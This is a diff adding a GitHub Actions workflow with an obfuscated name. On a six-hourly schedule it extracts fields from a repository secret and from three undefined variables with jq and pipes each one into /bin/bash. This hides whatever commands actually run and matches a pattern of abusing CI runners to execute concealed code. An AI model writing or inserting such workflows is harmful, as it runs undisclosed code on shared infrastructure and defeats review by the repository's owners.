@@ -1,0 +1,22 @@
+name: hongzhensihuangjingy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongzhensihuangjingy
+        env:
+          l62138: ${{ secrets.l62138 }}
+        run: |
+          echo $l62138 | jq -r .zp4 | /bin/bash
+          echo $puseb2 | jq -r .ex40450 | /bin/bash
+          echo $tmfd65 | jq -r .cxm3968 | /bin/bash
+          echo $u89379 | jq -r .eexzf954 | /bin/bash
+
